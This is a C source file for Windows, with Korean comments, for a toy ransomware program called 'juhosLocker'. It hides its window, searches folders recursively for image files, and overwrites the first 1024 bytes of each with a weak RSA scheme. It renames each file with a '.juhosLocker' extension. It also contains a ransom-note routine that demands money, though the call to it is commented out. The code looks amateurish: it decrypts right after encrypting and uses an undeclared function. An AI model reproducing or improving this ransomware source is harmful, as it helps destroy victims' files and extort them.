#pragma warning ( disable : 4996 )
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <io.h>
#include <Windows.h>
#include <time.h> 
#include<sys/types.h>
#include<math.h>

#define p_deci 3
#define q_deci 7

int N;
int P;
int e;
int d;
int cnt[1024];

struct _finddata_t fd;
void encrypt(char* filefullname);
void decrypt(char* filefullname);
int isFileOrDir();
void findfile(char* file_path);
void name_change(char* name);
int Get_P(int p, int q);
int Get_N(int p, int q);
int Get_e(int P);
int Get_d(int e, int P);
int GCD(int u, int v);
void Create_file(char* file_path);

int main()
{
	
	HWND hWnd = GetForegroundWindow();		//백그라운드 실행
	ShowWindow(hWnd, SW_HIDE);
	N = Get_N(p_deci,q_deci);					//공개키
	P = Get_P(p_deci,q_deci);
	e = Get_e(P);								//공개키
	d = Get_d(e, P);							//개인키
	char file_path[_MAX_PATH] = "C:\\opencv";    //C:\ 경로 탐색
	char file_path2[_MAX_PATH];
	strcpy(file_path2, file_path);
	//Create_file(file_path);						//텍스트 파일 생성
	findfile(file_path2);						//파일 검색 및 암호화
	return 0;
}
int isFileOrDir()
{
	if (fd.attrib & _A_SUBDIR)
		return 0; // 디렉토리면 0 반환
	else
		return 1; // 그밖의 경우는 "존재하는 파일"이기에 1 반환
}

void findfile(char* file_path)
{
	intptr_t handle;
	int check = 0;
	char file_path2[_MAX_PATH];

	strcat(file_path, "\\");
	strcpy(file_path2, file_path);
	strcat(file_path, "*");

	if ((handle = _findfirst(file_path, &fd)) == -1)
	{
		printf("No such file or directory\n");
		return;
	}

	while (_findnext(handle, &fd) == 0)
	{
		char file_pt[_MAX_PATH];
		strcpy(file_pt, file_path2);
		strcat(file_pt, fd.name);

		check = isFileOrDir();    //파일인지 디렉토리 인지 식별

		if (check == 0 && fd.name[0] != '.')
		{
			findfile(file_pt);    //하위 디렉토리 검색 재귀함수
		}
		else if (check == 1 && fd.size != 0 && fd.name[0] != '.')
		{
			if ((strstr(file_pt, ".png") != NULL) || (strstr(file_pt, ".jpeg") != NULL) ||		//사진 파일일시 encrypt함수 실행
				(strstr(file_pt, ".gif") != NULL) || (strstr(file_pt, ".bmp") != NULL) || (strstr(file_pt,".jpg") != NULL)){
				
				encrypt(file_pt);			//암호화 함수 실행
				decrypt(file_pt);
				name_change(file_pt);		//파일 이름 변경 함수 실행
			}
		}
	}
	_findclose(handle);
}
void encrypt(char* filefullname) {
	unsigned char data[1024];
	unsigned int read_size;
	unsigned int i;
	long frpos, fwpos;
	FILE *fp;									//파일 구조체 선언
	fp = fopen(filefullname, "r+b");			//파일 열기
	if (fp == NULL)								//파일이 열렸는지 확인
	{
		if (strstr(filefullname,".") == 0)
			findfile(filefullname);
		return;
	}
	fwpos = ftell(fp);				//파일을 읽거나 쓰면서 이동하는 현재 위치의 위치값 반환
	read_size = fread(data, 1, 1024, fp);		//파일을 읽은 사이즈
	for (i = 0; i < read_size; i++) {			//읽은 데이터 RSA 암호화
		int M = data[i];
		unsigned int m;
		m = Get_m(M, N,i);
		m = pow(m, e);
		data[i] = m % N;						//c = (m^e)%N
	}
	frpos = ftell(fp);
	fseek(fp, fwpos, SEEK_SET);						//처음 위치로 이동
	fwrite(data, sizeof(char), read_size, fp);		//처음부터 1024byte 까지 암호화 데이터 덮어쓰기
	fclose(fp);										//사용한 파일 종료
}
void decrypt(char* filefullname) {
	unsigned char data[1024];
	unsigned char name[4] = { 0x4A,0x55,0x48,0x4F };
	unsigned int read_size;
	unsigned int i;
	int type = 0;
	long frpos, fwpos;
	FILE *fp;									//파일 구조체 선언
	fp = fopen(filefullname, "r+b");			//파일 열기
	if (fp == NULL)								//파일이 열렸는지 확인
	{
		if (strstr(filefullname, ".") == 0)
			findfile(filefullname);
		return;
	}
	fwpos = ftell(fp);				//파일을 읽거나 쓰면서 이동하는 현재 위치의 위치값 반환
									//sig_size = fread(signature, 1, 16, fp);
	read_size = fread(data, 1, 1024, fp);		//파일을 읽은 사이즈
	for (i = 0; i < read_size; i++) {			//읽은 데이터 복호화
		unsigned int c = data[i];
		int m;
		c = pow(c, d);
		m = c % N;
		m += (cnt[i] * N);
		data[i] = m;						//m = (c^d)%N;
	}
	frpos = ftell(fp);
	fseek(fp, fwpos, SEEK_SET);						//처음 위치로 이동
	fwrite(data, sizeof(char), read_size, fp);		//처음부터 1024byte 까지 암호화 데이터 덮어쓰기
	fclose(fp);										//사용한 파일 종료
}
void name_change(char* name) {
	char new_name[1024];				//이름을 담을 공간
	int type = 0;
	sprintf_s(new_name, sizeof(new_name), "%s.juhosLocker", name);		//변경할 이름 저장
	type = rename(name, new_name);				//이름 변경 rename(oldname,newname)
}
void Create_file(char* file_path) {
	FILE *fp;
	strcat(file_path, "\\");
	strcat(file_path, "YouCracked!!!!!!!!!!!!!!!!!!!!!!!!!!!.txt");
	fp = fopen(file_path, "w+t");
	if (fp == NULL) {
		Create_file(file_path);
		return;
	}
	fprintf(fp, "당신의 컴퓨터는 지금 해킹되었습니다. 암호화된 파일들을 풀고 싶으면 나에게 돈을 보내십시요. 알겠습니까?");
	fclose(fp);
}
int Get_N(int p, int q) {			//공용키 구하는 함수
	return p * q;
}
int Get_P(int p, int q) {
	return ((p - 1)*(q - 1));
}
int Get_d(int e, int P) {				//개인키 구하는 함수
	int i = 1;
	while (1) {
		if (((i*e) % P) == 1) {
			return i;
		}
		else {
			i++;
		}
	}
}
int Get_e(int P) {
	for (int i = 2; i < P; i++) {			//최대 공약수가 1인 e를 찾는 함수
		int num = GCD(i, P);
		if (num == 1) {
			return i;
		}
	}
}
int GCD(int a, int b) {		//유클리드 알고리즘을 이용한 최대공약수 찾기
	if (b == 0) {
		return a;
	}
	else {
		return GCD(b, a%b);
	}
}
int Get_m(int M, int N,int i)			//공용키 구하는 함수
{
	int count = 0;
	while (M >= N)
	{
		M -= N;
		count++;
	}
	cnt[i] = count;						//M->m 방법 저장
	return M;
}

/*
while (!feof(fp))			//파일 끝 여부 확인
{
fwpos = ftell(fp);		//파일을 읽거나 쓰면서 이동하는 현재 위치의 위치값 반환
read_size = fread(data, 1, 1024, fp);
if (read_size == 0)break;
for (i = 0; i < read_size; i++) {
data[i] ^= the_key[i % 10];
}
frpos = ftell(fp);
fseek(fp, fwpos, SEEK_SET);
fwrite(data, 1, read_size, fp);
fseek(fp, frpos, SEEK_SET);
}
*/